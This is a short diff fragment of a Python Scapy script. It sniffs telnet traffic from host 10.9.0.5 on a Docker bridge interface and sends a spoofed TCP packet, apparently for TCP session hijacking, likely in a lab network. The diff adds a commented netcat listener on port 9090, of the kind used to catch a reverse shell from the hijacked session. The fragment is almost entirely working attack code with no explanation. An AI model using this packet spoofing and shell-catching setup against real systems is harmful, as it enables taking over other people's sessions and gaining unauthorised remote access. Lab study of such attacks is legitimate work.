@@ -10,3 +10,4 @@ def spoof_tcp (pkt) :
   ls(spoofpkt)
   send (spoofpkt, verbose=0)
 pkt=sniff(iface = 'br-5b0cbd14ca3b', filter='tcp and port 23 and src 10.9.0.5', prn=spoof_tcp, count=1)
+#nc -lnv 9090 
